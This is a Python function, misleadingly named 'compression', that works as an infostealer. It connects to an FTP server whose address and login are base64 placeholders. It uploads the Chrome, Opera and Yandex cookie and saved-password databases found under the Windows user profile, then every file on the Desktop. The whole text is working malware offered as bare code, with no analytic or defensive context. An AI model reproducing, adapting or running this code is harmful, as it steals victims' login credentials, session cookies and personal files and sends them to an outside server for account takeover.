def compression():
    con = FTP(base64.b64decode('<base_64_auth_encode>'),base64.b64decode('<base_64_auth_encode>'),base64.b64decode("<base_64_auth_encode>"))
    UserName = '\\' + getpass.getuser()
    try:
        con.mkd(getpass.getuser())
    except:
        pass
    con.cwd(getpass.getuser())
    dir_desktop = 'C:\\Users'+UserName+'\\Desktop\\'
    dir_cookie_google = 'C:\\Users'+UserName+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
    dir_pass_google = "C:\\Users"+UserName+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    dir_cookie_yandex = "C:\\Users"+UserName+"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
    dir_pass_yandex = "C:\\Users"+UserName+"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker"
    dir_cookie_opera = "C:\\Users"+UserName+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"
    dir_pass_opera = "C:\\Users"+UserName+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
    dir_google = "C:\\Users"+UserName+"\\AppData\\Local\\Google\\Chrome\\User Data\\Safe Browsing Cookies"
    dir_firefox = "C:\\Users"+UserName+"\\AppData\\Roaming\\Mozilla\\Firefox"
    dir_yandex = "C:\\Users"+UserName+"\\AppData\\Local\\Yandex"
    dir_opera = "C:\\Users"+UserName+"\\AppData\\Roaming\\Opera Software"
    if (os.path.exists(dir_google)) == True:
        filename = "google"+str(random.randint(1, 10000))
        filename2 = "google_pass" + str(random.randint(1, 10000))
        with open(dir_cookie_google, "rb") as content:
            con.storbinary("STOR %s" % filename, content)
        with open(dir_pass_google, "rb") as content:
            con.storbinary("STOR %s" % filename2, content)
    if (os.path.exists(dir_opera)) == True:
        filename = "opera"+str(random.randint(1, 10000))
        filename2 = "opera_pass" + str(random.randint(1, 10000))
        with open(dir_cookie_opera, "rb") as content:
            con.storbinary("STOR %s" % filename, content)
        with open(dir_pass_opera, "rb") as content:
            con.storbinary("STOR %s" % filename2, content)
    if (os.path.exists(dir_yandex)) == True:
        filename = "yandex"+str(random.randint(1, 10000))
        filename2 = "yandex_pass" + str(random.randint(1, 10000))
        with open(dir_cookie_yandex, "rb") as content:
            con.storbinary("STOR %s" % filename, content)
        with open(dir_pass_yandex, "rb") as content:
            con.storbinary("STOR %s" % filename2, content)
    try:
        for i in range(len(os.listdir(dir_desktop))):
            try:
                with open(dir_desktop + os.listdir(dir_desktop)[i], 'rb') as content:
                    con.storbinary("STOR %s" % os.listdir(dir_desktop)[i], content)
            except IOError:
                pass
    except OSError:
        pass
    